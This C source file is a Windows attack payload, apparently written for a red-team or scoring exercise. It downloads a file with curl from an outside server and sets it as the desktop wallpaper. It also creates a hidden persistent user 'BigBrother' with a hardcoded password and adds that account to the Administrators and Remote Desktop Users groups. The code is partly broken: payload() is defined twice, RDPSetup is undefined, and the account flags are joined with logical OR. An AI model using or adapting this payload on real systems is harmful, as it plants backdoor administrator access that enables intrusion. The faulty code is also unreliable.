//Michael Burke
//Payload for the windows jumper.

#include <windows.h>

//needed for user addition
#include <LM.h>
#include <stdio.h>
/*

#include <unistd.h>
//*/
int changeBackground() {
    if (access("C:\\uwubuntu.png", F_OK) != 0) {
        //file does not exist
        system("curl http://server.mdbooktech.com/uwubuntu.png -s > C:\\uwubuntu.png");
        //printf("Downloaded uwubuntu.png\n");
    }
    else {
        char wallpaperpath[300];
        SystemParametersInfo(SPI_GETDESKWALLPAPER, 300, wallpaperpath, 0);
        if (strcmp(wallpaperpath, "C:\\uwubuntu.png") == 0) {
            //printf("Already set\n");
            return 1;
        }
    }
    //printf("Not set. Setting...\n");
    const wchar_t* path = L"C:\\uwubuntu.png";
    int result;
    //printf("Setting as desktop background...\n");
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
    if (result == 1) {
        //printf("Done");
        return 1;
    }
    return 0;
}

//NetUserSetInfo for all users and change country code for Ukranien (UA) / 866




int PersistientUser() {
    //taken from https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
    USER_INFO_2 ui;
    USER_INFO_2 info;
    LOCALGROUP_MEMBERS_INFO_2* groupInfo;

    DWORD level = 1;
    DWORD error = 0;

    const wchar_t* password = L"defaultscoringpass";
    const wchar_t* name = L"BigBrother";
    const wchar_t* comment = L"The best books are those that tell you what you know already.";
    const wchar_t* fullName = L"War is Peace";

    ui.usri2_name = (LPWSTR)name;
    ui.usri2_password = (LPWSTR)password;
    ui.usri2_priv = USER_PRIV_USER;
    ui.usri2_home_dir = NULL;
    ui.usri2_comment = (LPWSTR)comment;
    ui.usri2_flags = UF_SCRIPT || UF_DONT_EXPIRE_PASSWD || UF_DONT_REQUIRE_PREAUTH || UF_TRUSTED_FOR_DELEGATION || UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
    ui.usri2_script_path = NULL;
    ui.usri2_auth_flags = 0;
    ui.usri2_full_name = (LPWSTR)fullName;
    ui.usri2_usr_comment = NULL;
    ui.usri2_parms = NULL;
    ui.usri2_workstations = NULL;
    ui.usri2_acct_expires = TIMEQ_FOREVER;
    ui.usri2_max_storage = USER_MAXSTORAGE_UNLIMITED;
    ui.usri2_logon_hours = NULL;
    ui.usri2_logon_server = NULL;
    ui.usri2_country_code = 840;
    ui.usri2_code_page = 437;

    //NET_API_STATUS status = NetUserDel(NULL, (LPWSTR)name);
    NET_API_STATUS status = NetUserAdd(NULL, 2, (LPBYTE)&ui, &error);
    if (status != NERR_Success) {
        NetUserGetInfo(NULL, name, 2, (LPBYTE*)&info);
        if (info.usri2_acct_expires != TIMEQ_FOREVER || info.usri2_password != (LPWSTR)password) {
            NET_API_STATUS status = NetUserDel(NULL, (LPWSTR)name);

            if (status != NERR_Success) {
                //printf("user not deleted");
                return 0;
            }
            else {
                RDPSetup();
                return 0;
            }
        }



    }

    LOCALGROUP_MEMBERS_INFO_3 currentAddition;
    currentAddition.lgrmi3_domainandname = (LPWSTR)name;
    LPCWSTR groupname = L"Administrators";
    LPCWSTR rdpGroup = L"Remote Desktop Users";



    status = NetLocalGroupAddMembers(NULL, groupname, 3, (LPBYTE)&currentAddition, 1);
    if (status != NERR_Success) {
        //printf("failed to add member to admin");
        return 0;
    }
    status = NetLocalGroupAddMembers(NULL, rdpGroup, 3, (LPBYTE)&currentAddition, 1);
    if (status != NERR_Success) {
        //printf("failed to add member to rdp group");
        return 0;
    }



    //printf("adding user worked\n");
    return 0;

}
int payload() {
    //Execute whatever you want here
    changeBackground();
    PersistientUser();
    return 0;

}


int payload() {
    //Execute whatever you want here
    //changeBackground();
    RDPSetup();

}


int main(int argc, char *argv[]){
    payload();
}

